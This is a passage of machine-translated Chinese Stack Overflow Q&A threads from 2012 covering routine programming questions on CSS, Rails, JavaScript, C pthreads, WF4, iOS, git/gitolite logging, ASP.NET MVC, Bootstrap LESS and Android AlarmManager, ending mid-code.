如果您只想为输入按钮设置图像，那么您可以使用 CSS 而不是将按钮更改为`asp:ImageButton`

例如。：

```
 <input class="SubmitButton" type="submit" value="submit form" 
  onclick="window.form1.submit();" id="subBut"> 
```

CSS

```
.SubmitButton {
background:url(images/sendreq.jpg) no-repeat;
cursor:pointer;
width: 28px;
height: 28px;
border: none;
} 
```

# ruby-on-rails - centos中radiant的问题

> ID：12820134
> 
> 赞同：0
> 
> 时间：2012-10-10T13:09:21.407
> 
> 标签：ruby-on-rails, ruby-on-rails-3, radiant

我有 radiant cms 版本 0.8.2 的问题。在应用程序中，当我单击表单上的提交时，应用程序得到一个错误未初始化控制器，它位于 radiant/app/controller。

错误 ：

NameError（未初始化的常量 ResourceController）：vendor/extensions/smart/app/controllers/quote_requests_controller.rb:1 /usr/lib/ruby/1.8/webrick/httpserver.rb:104:in `service' /usr/lib/ruby/1.8/webrick/httpserver.rb:65:in`run'

/usr/lib/ruby/1.8/webrick/server.rb:173:in `start_thread' /usr/lib/ruby/1.8/webrick/server.rb:162:in`start'

/usr/lib/ruby/1.8/webrick/server.rb:162:in `start_thread' /usr/lib/ruby/1.8/webrick/server.rb:95:in`start'

/usr/lib/ruby/1.8/webrick/server.rb:92:in `each' /usr/lib/ruby/1.8/webrick/server.rb:92:in`start'

/usr/lib/ruby/1.8/webrick/server.rb:23:in `start' /usr/lib/ruby/1.8/webrick/server.rb:82:in`start'

ResourceController 位于 radiant/app/controllers/admin/resource_controller.rb

在 quote_requests_controller.rb 的第一行，“class QuoteRequestsController < ResourceController::Base”就在那里。

rails 2.3.14 ruby​​ 1.8.7 ruby​​gems-update (1.4.2) radiant 0.8.2

我已经完成了这个问题的谷歌搜索，请帮助我找出错误。

谢谢你，尼拉夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T00:17:28.577

你说 ResourceController 在 radiant/app/controllers/admin/resource_controller.rb 放在那里的一个类实际上应该是 Admin::ResourceController，而不仅仅是 ResourceController。

然后类定义行将显示为：“class QuoteRequestsController < Admin::ResourceController”。然而！该类已经存在；这是大多数管理控制器继承的。

为您的控制器取一个新名称，或者将其移出 admin/ 文件夹。

# google-static-maps - Google Static Maps API 出现“加载资源失败”javascript 错误

> ID：12820149
> 
> 赞同：4
> 
> 时间：2012-10-10T13:10:23.747
> 
> 标签：google-static-maps

我正在使用静态地图 Api 来显示静态图像地图。我在一页中列出了其中的 15-20 个，在我测试几分钟后，我现在收到以下 javascript 错误：

“加载资源失败：服务器响应状态为 403（禁止）”

我已确保我添加了正确的 API 密钥，并且还为密钥提供了正确的引荐来源网址。

有什么建议可以解决这个问题吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-17T19:50:20.973

如果用户超出这些限制，服务器将返回 HTTP 403 状态并显示下图以指示已超出配额

[图片](https://developers.google.com/maps/documentation/staticmaps/images/quota.png)

# javascript - 对象文字 - 添加项目

> ID：12820150
> 
> 赞同：0
> 
> 时间：2012-10-10T13:10:29.957
> 
> 标签：javascript

我的代码中有这个：-

```
var chartOptions = {
      series: {
               bars: { show: true }
              }
}; 
```

有没有办法我可以通过代码将另一个项目添加到 chartOptions 对象，以便将它添加到系列部分，如下所示：-

```
series: {
    bars: {show: true, fillColor="Red"}
} 
```

我该怎么做呢？我期待类似的东西： -

```
chartOptions["series"]["bars"]["fillColor"] = "Red" 
```

但这不起作用。我对此很陌生，因此将不胜感激任何帮助。

马特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:13:40.257

您可以通过使用`:`而不是内联添加它`=`

```
series: {
    bars: {show: true, fillColor: "Red"}
} 
```

或者，您可以使用[`jQuery.extend()`](http://api.jquery.com/jQuery.extend/)JavaScript 将其添加到代码中：

```
chartOptions.series.bars.fillColor = "Red"; 
```

您的代码`chartOptions["series"]["bars"]["fillColor"] = "Red"`也应该可以工作，但它是处理数组时的符号。处理对象时通常使用点表示法。不过，这两种表示法大多是可以互换的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:23:53.900

```
function extend(destination, source) {
    for (var property in source) {
        destination[property] = source[property];
    }

    return destination;
}

var chartOptions = {
    series: {
        bars: {
            show: true
        }
    }
};

Object.extend(chartOptions.series.bars, {
    fillColor: "Red"
});

console.log(chartOptions); 
```

​</p>

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:25:13.350

看看这个 jsfiddle：http: [//jsfiddle.net/5KMfy/4/](http://jsfiddle.net/5KMfy/4/)

我写了 2 个工作示例，有和没有 jQuery，希望这会有所帮助。

# c - 结构的未定义字段作为参数传递给线程

> ID：12820152
> 
> 赞同：0
> 
> 时间：2012-10-10T13:10:35.073
> 
> 标签：c

我有一个以这种方式声明和分配的结构

```
typedef {
      char* a; char* b; int c; int d; FILE *e;
} t;
[...]

    ready= malloc(sizeof(t));
    strncpy (ready->a, ss1, length);
    strncpy (ready->b, ss2, length);
    ready->c= f; ready->d= g;
    ready->e= fopen(file, "w"); 
```

我想传递给一个线程

```
pthread_create(thread_id, NULL, worker_start, &ready); 
```

当我开始在线程函数中做一些事情时，很明显我在调用 create 之前在 main 中初始化的字段没有在线程中定义。

```
void* worker_start(void *param) {
    t *current;

    current = (t*) param;
    ...
} 
```

代码有什么问题？我在这里做坏事吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:14:02.113

当您将指针传递给线程时，您将其作为指向指针的指针传递（由于您使用了 address-of 运算符`&`）。您不需要这样做，并且在线程函数中您不会将其视为指向指针的指针，而只是普通指针。

创建线程时删除与号（`&`），事情应该会更好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-10T13:13:49.480

一个问题是文件 a 和 b 是指向 char 的指针，并且不为字符分配内存。

要么只是将它们指向字符串

```
ready->a =  ss1;
ready->b =  ss2; 
```

或复制字符串

```
ready->a = strdup( ss1 );
ready->b = strdup( ss2 ); 
```

另一个问题是根据@JoachimPileborg 的回答

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:15:05.937

在哪里做`ready->a`和`ready->b`指向？看起来你的写作是通过未初始化的指针。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:44:54.077

正如 Joachim Pileborg 所说，您不应该将指针传递给指针。

做就是了 ：

`pthread_create(thread_id, NULL, worker_start, ready);`

并且不要忘记使用关键字 STRUCT ：

```
typedef struct t_type {
 char* a; char* b; int c; int d; FILE *e;
} t; 
```

# c# - Windows 工作流服务 - 自定义服务主机。处理工作流事件

> ID：12820154
> 
> 赞同：0
> 
> 时间：2012-10-10T13:10:39.897
> 
> 标签：c#, web-services, workflow-foundation-4, workflow-foundation, workflowservice

我将非常简单的工作流程作为服务托管。我只想处理此工作流程中的异常。

我的工作流程将“字符串”作为参数并尝试将其转换为 int。因此，每当我发送像“asasafs”这样的数据时，它都会失败并引发异常。非常简单 ：）

我读过我可以创建自己的 WorkflowServiceHostFactory，但不幸的是我无法完成我的简单任务，这是我的实现：

```
public class MyServiceHostFactory : System.ServiceModel.Activities.Activation.WorkflowServiceHostFactory
{
    protected override WorkflowServiceHost CreateWorkflowServiceHost(Activity activity, Uri[] baseAddresses)
    {
        return base.CreateWorkflowServiceHost(activity, baseAddresses);
    }

    protected override WorkflowServiceHost CreateWorkflowServiceHost(WorkflowService service, Uri[] baseAddresses)
    {

        var host = base.CreateWorkflowServiceHost(service, baseAddresses);

        WorkflowRuntimeBehavior wrb = host.Description.Behaviors.Find<WorkflowRuntimeBehavior>();
        if (wrb == null)
            wrb = new WorkflowRuntimeBehavior();
        wrb.WorkflowRuntime.ServicesExceptionNotHandled += WorkflowRuntime_ServicesExceptionNotHandled;
        wrb.WorkflowRuntime.Started += WorkflowRuntime_Started;
        wrb.WorkflowRuntime.WorkflowCompleted += WorkflowRuntime_WorkflowCompleted;
        host.Description.Behaviors.RemoveAll<WorkflowRuntimeBehavior>();
        host.Description.Behaviors.Add(wrb);
        host.Faulted += host_Faulted;
        host.UnknownMessageReceived += host_UnknownMessageReceived;
        return host;
    }

    void workflowRuntime_WorkflowCreated(object sender, WorkflowEventArgs e)
    {
        throw new NotImplementedException();
    }

    void WorkflowRuntime_WorkflowCompleted(object sender, System.Workflow.Runtime.WorkflowCompletedEventArgs e)
    {
        throw new NotImplementedException();
    }

    void WorkflowRuntime_Started(object sender, System.Workflow.Runtime.WorkflowRuntimeEventArgs e)
    {
        throw new NotImplementedException();
    }

    void WorkflowRuntime_ServicesExceptionNotHandled(object sender, System.Workflow.Runtime.ServicesExceptionNotHandledEventArgs e)
    {
        throw new NotImplementedException();
    }

    void host_UnknownMessageReceived(object sender, System.ServiceModel.UnknownMessageReceivedEventArgs e)
    {
        throw new NotImplementedException();
    }

    void host_Faulted(object sender, EventArgs e)
    {
        throw new NotImplementedException();
    }
} 
```

我正在使用 Visual Studio 2k10 和 iisexpress，每当工作流引发异常时，调试器都不会中断我的任何事件处理程序。你知道如何正确地做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T15:10:39.500

这真的取决于你想要做什么。对于将 SOAP 消息发送到工作流的人来说，使用标准 WCF 堆栈，因此使用 IErrorHandler 或消息检查器，您应该能够看到返回给客户端的错误。

然而，这只是故事的一部分。将响应发送回客户端时，工作流并未完成。相反，只要它有任何工作要做，它就会继续执行。因为那是在对客户端的响应发送之后，WCF 堆栈不会向您显示发生的任何错误。

相反，使用 TrackingParticipant 并检查 FaultPropagationRecord 会告诉您活动本身未处理的任何异常。它可能仍由 TryCatch 活动处理。检查 WorkflowInstanceUnhandledExceptionRecord 会告诉您异常未在工作流中处理并一直传播到运行时。

# jquery - 如何在表单中逐行显示json数组

> ID：12820156
> 
> 赞同：0
> 
> 时间：2012-10-10T13:10:46.283
> 
> 标签：jquery, json, forms

我做了一个 ajax 调用来发布，然后在两个给定日期之间的所有日子里从控制器中检索。这是我的 JS 函数：

```
function  getDays()
    {

          var  date1= $('#start_date').val();
          var  date2=$('#end_date').val();
          $.ajax({
            type:'POST',
            url : '<?php echo site_url()."/public/hours/getHoursDetails/"; ?>',
            data : 'start_date='+date1+'&end_date='+date2,

            success:function(data)
                 {  $('#result').html(data);
                    $('#hoursDetails').show();
                           }

                    }); 
     } 
```

我在我的视图中列出了我需要的所有日子。但我想做的是在每个日期之后显示一些输入，比如

```
<label><strong>Action(s)</strong></label>   
<textarea class="span8" style="height:100px" placeholder="Description de votre action"
id="action" name="action"></textarea> 
<label><strong>Number of hours :</strong></label><input type="text" class="span4" id="hours" name="hours" placeholder="number of hours"/> 
```

我的问题是我不能逐行显示每个日期。这是我的观点的一个例子：

```
"Tuesday, October 09 2012."
"Wednesday, October 10 2012."
"Thursday, October 11 2012."
"Friday, October 12 2012." 
```

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T13:30:52.667

您不能只从结果中获取每个日期，附加额外的 HTML，然后在插入 #result 元素之前将它们全部添加在一起吗？

将额外的 HTML 放入变量中：

```
var inputHTML = '<label><strong>Action(s)</strong></label><textarea class="span8" style="height:100px" placeholder="Description de votre action" id="action" name="action"></textarea><label><strong>Number of hours :</strong></label><input type="text" class="span4" id="hours" name="hours" placeholder="number of hours"/>';
var date1= etc... 
```

然后在成功函数内部：

```
var resultHTML = ""
var datesArray = data.split('.');
for (i=0;i<datesArray.length-1;i++) {
    resultHTML += datesArray[i] + inputHTML;
}
$('#result').html(resultHTML); 
```

# ios - 如何以 hh:mm:ss 格式输入时间值？

> ID：12820159
> 
> 赞同：2
> 
> 时间：2012-10-10T13:10:53.717
> 
> 标签：ios, cocoa, ios4, xcode4

我需要输入时间值 hh:mm:ss`(09:45:56)`格式，但是在 Xcode 文本字段中我总是`(094556)`以格式输入 -
如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T14:25:32.017

您可以`NSDateFormatter`用来解析任何自定义格式

```
NSDateFormatter *dateformatter = [[NSDateFormatter alloc] init];

dateformatter.dateFormat = @"HH':'mm':'ss";

NSString *mydate = @"09:45:56" 

NSDate *parseddate = [dateformatter dateFromString:mydate]; 
```

这应该给你一个“今天上午 9.45”的日期

NSDateFormatter 的文档非常好，但您可以在此处找到可能的特定格式化程序变体。它从苹果文档链接。

[http://www.unicode.org/reports/tr35/tr35-19.html#Date_Format_Patterns](http://www.unicode.org/reports/tr35/tr35-19.html#Date_Format_Patterns)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:29:19.947

如果我正确理解了这个问题，您想在 UITextField 中输入 HH:mm:ss 格式的文本吗？

在这种情况下，使您的视图控制器成为 UITextFieldDelegate 并实现此选择器：

```
-(BOOL)textField:(UITextField *)textField shouldChangeCharactersInRange:(NSRange)range replacementString:(NSString *)string 
```

每次用户输入或删除字符时，都会调用此方法。此时，您可以确定是否格式化字符串。例如，在他们键入第二个字符后，创建了 09 的小时部分，您可以在字符串后面附加一个“:”，使其看起来像“09:”。

另外一个选项。在他们完成输入整个字符串后，使用此选择器对其进行格式化：

```
- (void)textFieldDidEndEditing:(UITextField *)textField 
```

# authentication - Zend Framework 2 + Doctrine：尝试进行身份验证

> ID：12820163
> 
> 赞同：1
> 
> 时间：2012-10-10T13:11:01.017
> 
> 标签：authentication, doctrine, zend-framework2

我正在尝试在 Zend Framework 2 + Doctrine 中进行身份验证：

我想我添加了我需要的所有东西到 Module.php + module.config.php

在我的控制器中，我这样做：

```
$authService = $this->getServiceLocator()->get('Zend\Authentication\AuthenticationService');
$adapter = $authService->getAdapter();
$adapter->setIdentityValue($formdata['username']);
$adapter->setCredentialValue($formdata['password']);
$authResult = $adapter->authenticate(); 
```

它一直工作到 $adapter->authenticate();

错误是：

> 警告：class_parents(): Class does not exist and could not be loaded in /.../doctrine/common/lib/Doctrine/Common/Persistence/Mapping/RuntimeReflectionService.php on line 40

```
public function getParentClasses($class)
{
      return class_parents($class); //Line 40
} 
```

# .net - 在 WinForms 中停止冒泡事件

> ID：12820166
> 
> 赞同：1
> 
> 时间：2012-10-10T13:11:08.880
> 
> 标签：.net, winforms, events, event-bubbling

我有一个（自定义）`MyTextbox`。MyTextbox 在 on (custom) 上`MyPanel`，面板在`MyForm`.

当用户在 MyTextbox 中编辑文本并按下时，说“DEL”，MyForm 收到`_KeyDown`事件...

但是在表单上，​​我在按下“删除”时编写了其他操作，因此它执行表单操作以及文本框选择删除...

如何停止从文本框到表单的事件传播，或者将文本框标识为事件的发送者？

PS。
由于多种原因，我无法将*KeyPreview*设置为“False”，我需要找到另一个解决方案。

聚苯乙烯。
想象一下你有一个可编辑的“矩形”的 MS Word 编辑器......如果你编辑矩形中的文本（在编辑模式下选择矩形），你的“Del”应该删除矩形中的字符，如果没有，它应该删除矩形本身...（如果选择了矩形）。

就我而言，我处于矩形的编辑模式中，我选择了一些文本，但是当我按 DEL 而不是删除文本时，会删除矩形本身......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:17:36.577

确保表单的 KeyPreview 属性设置为 False，这通常是表单的默认值。

如果您有一个可能的解决`KeyPreview=true`方法是检查活动控件并过滤表单对关键事件的处理：

```
protected override void OnKeyDown(KeyEventArgs e) {
  if (ActiveControl.GetType() != typeof(TextBox)) {
    base.OnKeyDown(e);
  }
} 
```

# git - 有 git 活动日志吗？

> ID：12820167
> 
> 赞同：5
> 
> 时间：2012-10-10T13:11:08.760
> 
> 标签：git, msysgit, windows-server, git-bare

这里出了点问题。请允许我介绍一下背景。

今天，我尝试推送到我们公司默认的裸 msysgit windows 服务器，并得到一个[可怕的错误消息，在 SO 中到处重复关于推送到 non-bare 的信息](https://stackoverflow.com/questions/2816369/git-push-error-remote-rejected-master-master-branch-is-currently-checked)。我认为这个消息很奇怪，因为我的服务器应该是光秃秃的。昨天它工作得很好。

然后我注意到**`core.bare`**，不知何故，设置为**`false`**！这是一个 repo `--bare`，它从来没有一个 " `.git`" 文件夹。然后我去检查，那里有一个 .git 文件夹，对我来说突然出现，令我沮丧！我问唯一一个可以在那里做某事的人，当然，他没有。

*编辑*：我只是注意到它只发生在`master`分支上，并且服务器`.git`似乎是在 10 月 1 日创建的，这可能是正确的，因为我不`master`经常推送。

该文件夹有 3gb，而裸文件夹，除了 ghostly 之外的所有 git 结构`.git`，有 6gb。虽然我的本地 .git 有 16 GB，所以我不确定那里发生了什么......更重要的是，我无法检查`git log`或`git reflog`. 将 bare 设置为 true 或 false 我得到同样的错误[`fatal: bad default revision 'HEAD'`](https://stackoverflow.com/questions/6214711/git-log-and-show-on-a-bare-repo)。现在我认为是时候考虑[如何恢复回购了](https://stackoverflow.com/questions/1545407/recovering-broken-git-repository)......

但在我了解所有恢复教条之前，我想知道：

*   是否有某种***git 活动日志***，以便我可以看到在 git 中发出的所有命令，以及由谁发出的？

找不到类似的东西，我担心没有。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:12:07.337

这就是为什么我们在我们的中央 git repo 服务器上安装了[gitolite V3](http://sitaramc.github.com/gitolite/)（通过简单地克隆[它的 repo](https://github.com/sitaramc/gitolite)并像在[这个安装脚本中一样](https://github.com/VonC/compileEverything/blob/master/gitolite/install_or_update_gitolite.sh)[安装它）。](http://sitaramc.github.com/gitolite/qi.html)

Gitolite 将拦截任何 git 命令，并且（除了它的[主要授权框架](http://sitaramc.github.com/gitolite/auth.html)功能之外）会将所述命令记录在`~/.gitolite/logs/gitolite-log-xxx`.

以下是此类日志的摘录：

```
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/triggers/post-compile/update-git-configs,POST_COMPILE
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/triggers/post-compile/update-gitweb-access-list,POST_COMPILE
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/commands/access,%,gitweb,R,any
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/commands/git-config,-r,%,gitweb\.
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/triggers/post-compile/update-git-daemon-access-list,POST_COMPILE
2012-08-16.12:20:20     29507           system,/home/gitadmin/gitolite/bin/commands/access,%,daemon,R,any
2012-08-16.12:20:20     29507   END
2012-08-20.07:39:12     17683   ssh     ARGV=gitoliteadm        SOC=git-upload-pack 'gitolite-admin'    FROM=127.0.0.1
2012-08-20.07:39:12     17683           access(gitolite-admin, gitoliteadm, R, 'any'),-> refs/.*
2012-08-20.07:39:12     17683           trigger,Writable,access_1,ACCESS_1,gitolite-admin,gitoliteadm,R,any,refs/.*
2012-08-20.07:39:12     17683   pre_git gitolite-admin  gitoliteadm     R       any     -> refs/.*
2012-08-20.07:39:12     17683           system,git,shell,-c,git-upload-pack '/home/gitadmin/repositories/gitolite-admin.git'
2012-08-20.07:39:12     17683   END
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/triggers/post-compile/update-git-configs,POST_COMPILE
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/triggers/post-compile/update-gitweb-access-list,POST_COMPILE
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/commands/access,%,gitweb,R,any
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/commands/git-config,-r,%,gitweb\.
2012-08-16.12:20:19     29507           system,/home/gitadmin/gitolite/bin/triggers/post-compile/update-git-daemon-access-list,POST_COMPILE
2012-08-16.12:20:20     29507           system,/home/gitadmin/gitolite/bin/commands/access,%,daemon,R,any
2012-08-16.12:20:20     29507   END
2012-08-20.07:39:12     17683   ssh     ARGV=gitoliteadm        SOC=git-upload-pack 'gitolite-admin'    FROM=127.0.0.1
2012-08-20.07:39:12     17683           access(gitolite-admin, gitoliteadm, R, 'any'),-> refs/.*
2012-08-20.07:39:12     17683           trigger,Writable,access_1,ACCESS_1,gitolite-admin,gitoliteadm,R,any,refs/.*
2012-08-20.07:39:12     17683   pre_git gitolite-admin  gitoliteadm     R       any     -> refs/.*
2012-08-20.07:39:12     17683           system,git,shell,-c,git-upload-pack '/home/gitadmin/repositories/gitolite-admin.git'
2012-08-20.07:39:12     17683   END 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T21:37:19.243

您可以使用 reflog 来查看引用的移动方式，注册活动有时从通常的 git 日志中不可见（例如快进合并），但我认为这对您的情况无关紧要。

我相信你有这样的结构（顺便建议将 .git 扩展名放在裸仓库名称中，这样很容易区分）： ../core.bare.git/ 包含分支、配置、HEAD、钩子、信息、对象等 ../core.bare.git/.git 包含自己的一组分支、配置等我认为你在服务器上的 repo 完全没问题，你只需要从中删除 .git 文件夹并仔细检查配置文件仍然说它是一个裸仓库。

# erlang - 用于大查询的 Erlang API

> ID：12820170
> 
> 赞同：0
> 
> 时间：2012-10-10T13:11:16.687
> 
> 标签：erlang, google-bigquery, riak, google-compute-engine

是否有用于 bigquery 的 Erlang API？

我想在 Linux 实例中使用来自 Google Compute Engine 的 Bigquery。我想在那里运行 Riak NoSQL。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T22:17:21.050

据我所知，BigQuery 没有 Erlang 客户端。您始终可以手动生成 HTTP REST 请求——这对于大多数用例来说相对简单。或者，您可以执行运行 bq.py 命令行客户端的 shell 命令。

# javascript - 如何在我的 asp.net mvc 内的脚本文件中获取当前登录用户名

> ID：12820172
> 
> 赞同：12
> 
> 时间：2012-10-10T13:11:16.567
> 
> 标签：javascript, asp.net-mvc, asp.net-mvc-4

我有一个调用 JSON API 的脚本文件，我需要发送当前登录用户名作为调用的一部分。我尝试了以下方法：-

```
 $(document).ready(function () {
        var name = prompt("Please enter your packageid", "test");

        var fullurl = 'http://localhost:8080/jw/web/json/workflow/process/list?j_username=kermit&hash=9449B5ABCFA9AFDA36B801351ED3DF66&loginAs=' + HttpContext.Current.User.Identity.Name + 'packageId=' + name;
        $.ajax({
            type: "GET",
            url: fullurl,
            dataType: "JSONP",
            success: function (result) {
//code goes here 
```

但它会引发以下错误：- **'HttpContext' 未定义**

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-10-10T13:14:20.253

您的脚本正在寻找一个名为您的代码的**Javascript**变量`HttpContext`应该是

```
@HttpContext.Current.User.Identity.Name 
```

在剃刀

所以javascript变成了

```
 var fullurl = 'http://localhost:8080/jw/web/json/workflow/process/list?j_username=kermit&hash=9449B5ABCFA9AFDA36B801351ED3DF66&loginAs=@HttpContext.Current.User.Identity.Name&packageId=' + name; 
```

`&`如果您打算将它们作为单独的变量，那么您也会在用户名和 packageId 之间丢失

**编辑**：根据您的评论，这在 js 文件中（我想我在 OP 中错过了）

两种选择：

1.  是将用户名保存在调用脚本文件的页面上的变量中。像这样：

**页**

```
<script>
var usrName = "@HttpContext.Current.User.Identity.Name";
</script> 
```

**JS文件**

```
....&loginAs='+ usrName + '&packageId=' + name; 
```

选项二是根本不包含用户名，只从操作中获取它。仅当您发布到的页面位于同一应用程序上时，这只是一个选项

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:13:21.300

您可以只使用`User.Identity.Name`派生自`System.Web.WebPages.WebPageRenderingBase`（这意味着代码应该在视图文件中）。您不能直接在脚本文件中访问服务器端代码。

```
 $(document).ready(function () {
        var name = prompt("Please enter your packageid", "test");

        var fullurl = 'http://localhost:8080/jw/web/json/workflow/process/list?j_username=kermit&hash=9449B5ABCFA9AFDA36B801351ED3DF66&loginAs=@User.Identity.Name&packageId=' + name;
        $.ajax({
            type: "GET",
            url: fullurl,
            dataType: "JSONP",
            success: function (result) {
//code goes here 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-10T13:13:30.197

您必须使用 razor 在视图 (.cshtml) 中设置一个 javascript 变量，然后在脚本文件 (.js) 中使用它

所以在你看来：

```
<script type="text/javascript">    
            var userName = '@HttpContext.Current.User.Identity.Name';            
</script> 
```

然后你的脚本文件

```
 var fullurl = '....loginAs=' + userName  + 'packageId=' + name; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-10T13:24:12.657

```
$(document).ready(function () {
    var name = prompt("Please enter your packageid", "test");

    var fullurl = 'http://localhost:8080/jw/web/json/workflow/process/list?j_username=kermit&hash=9449B5ABCFA9AFDA36B801351ED3DF66&loginAs=' + <%= HttpContext.Current.User.Identity.Name %> + 'packageId=' + name;
    $.ajax({
        type: "GET",
        url: fullurl,
        dataType: "JSONP",
        success: function (result) { 
```

上面的代码应该可以工作，在 javascript 前端，您将无法访问仅在服务器上可用的 HTTPContent 对象，但将它们放在服务器代码中您应该能够访问相同的对象。

或者您可以使用从服务器设置的值来隐藏控件

```
<input type='hidden' id='uid' runat='server'> 
```

服务器代码看起来像

```
uid.value = HTTPContext.Current.User.Identity.Name; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-07-24T02:20:22.163

```
 @User.Identity.Name 
```

您可以通过前缀@直接访问脚本部分中的用户身份

```
 @User.FindFirst(ClaimTypes.NameIdentifier).Value 
```

也是一个不错的选择。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-02-12T16:04:59.143

> `var usrName = '<%=@HttpContext.Current.User.Identity.Name%>'`

# css - 如何使用 LESS 使用 Twitter Bootstrap 创建流畅的语义布局？

> ID：12820173
> 
> 赞同：2
> 
> 时间：2012-10-10T13:11:18.993
> 
> 标签：css, twitter-bootstrap, grid, less

我想使用 LESS 创建流畅的布局，而不是在 html 代码上使用像 .span6 这样的 Bootstrap 网格类。我怎样才能做到这一点？当我在没有 LESS 的情况下编写时，我创建了这样的布局：

```
<div class="container-fluid">

<div class="row-fluid" id="header">
    <div class="span4 block">
        <h1 class="title">Sample Site</h1>
        <h2 class="sub-title">Powered by Twitter Bootstrap</h2>
    </div>
    <div class="span6 block">
        <ul class="nav nav-pills">
            <li class="active"><a href="#">Home</a></li>
            <li><a href="#">Pages</a></li>
            <li><a href="#">Typography</a></li>
            <li><a href="#">UI</a></li>
            <li><a href="#">Calendar</a></li>
            <li><a href="#">Tables</a></li>
        </ul>
    </div>
    <div class="span2 block">
        <div class="btn-group open">
            <button class="btn">Dropdown</button>
            <button class="btn dropdown-toggle" data-toggle="dropdown">
                <span class="caret"></span>
            </button>
            <ul class="dropdown-menu">
                <li><a href="#">Change password</a></li>
                <li><a href="#">Log in with another user</a></li>
                <li><a href="#">Change token</a></li>
                <li><a href="#">Log out</a></li>
            </ul>
        </div>
    </div>
</div>

<div class="row-fluid" id="slider">
    <div class="span12 block">
        <div id="myCarousel" class="carousel slide">
            <div class="carousel-inner"> 
```

现在，我的布局看起来像下面这样：

```
<div id="wrap">
<div id="header">
    <div id="logo">SiteLogo</div>
    <div id="top-menu">
        <ul>
            <li><a href="#">Home</a></li>
            <li><a href="#">Page 1</a></li>
            <li><a href="#">Page 2</a></li>
        </ul>
    </div>
    <div id="logout">
        <a href="#">Logout</a>
    </div>
</div>
<div id="slider"> 
```

如果我想制作 div#wrap -> .container-fluid, div#header -> .row-fluid, div#logo -> .span4, div#top-menu -> 我应该在 .less 文件上写什么.span6, div#logout -> .span2 没有在 html 代码上写这个类？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T13:48:33.653

首先，这不会是语义上的，至少不再如此。

`<div id="top-menu">`is `<nav>`or的语义形式`<nav id="top">`

的语义形式`<div id="header">`是`<header>`

无论如何，这里有执行此操作的说明：

[请停止在您的 HTML 中嵌入 Bootstrap 类](http://ruby.bvision.com/blog/please-stop-embedding-bootstrap-classes-in-your-html)

不过，老实说，它并不像作者想象的那么简单。仅仅因为你有一个`<nav>`继承`.nav`自 Bootstrap 的样式并不意味着它的孩子也会继承继承的样式。

因此，如果我从 中定义样式`.nav ul`，`<ul>`则元素在`<nav>`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-07-03T16:36:07.400

这对我有用..张贴以防万一它帮助其他人。

**用于语义流体网格的 Mixin：**

```
.makeFluidRow(){
    width: 100%;
    .clearfix();
}

.makeFluidCol(@span:1,@offset:0){
    float: left;
    #grid > .fluid .span(@span);
    #grid > .fluid .offset(@offset);
    &:first-child {
        margin-left: 0;
        .offsetFirstChild(@offset);
    }
} 
```

**像使用非流体 mixins 一样使用它们：**

```
div#header{
    .makeFluidRow();
    div#logo {
        .makeFluidCol(4); //Spans 4 cols
    }
    div#top-menu {
        .makeFluidCol(6); //Spans 6 cols
    }
    div#logout {
        .makeFluidCol(2); //Spans 2 cols
        //Or you could have span1, offset1 using .makeFluidCol(1,1);
    }    
} 
```

# android - 如何将 AlarmManager 附加到 BootReceiver

> ID：12820175
> 
> 赞同：0
> 
> 时间：2012-10-10T13:11:24.013
> 
> 标签：android, service, broadcastreceiver, alarmmanager

我在活动中有以下内容，它基本上在用户登录应用程序时设置了一个 AlarmManager。然后，AlarmManager 会定期调用另一个从手机数据库中删除事务的活动。这一切都很好。

```
// get a Calendar object with current time
Calendar cal = Calendar.getInstance();
// add 5 minutes to the calendar object
cal.add(Calendar.MINUTE, 1);
Intent intent = new Intent(EntryActivity.this, AlarmReceiver.class);
intent.putExtra("alarm_message", "deleting transactions");
// In reality, you would want to have a static variable for the request code instead of 192837
PendingIntent sender = PendingIntent.getBroadcast(EntryActivity.this, 192837,
                                    intent, PendingIntent.FLAG_UPDATE_CURRENT);
// Get the AlarmManager service
AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
//am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
am.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), 15000, sender); 
```

.

```
public class AlarmReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            String message = bundle.getString("alarm_message");
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
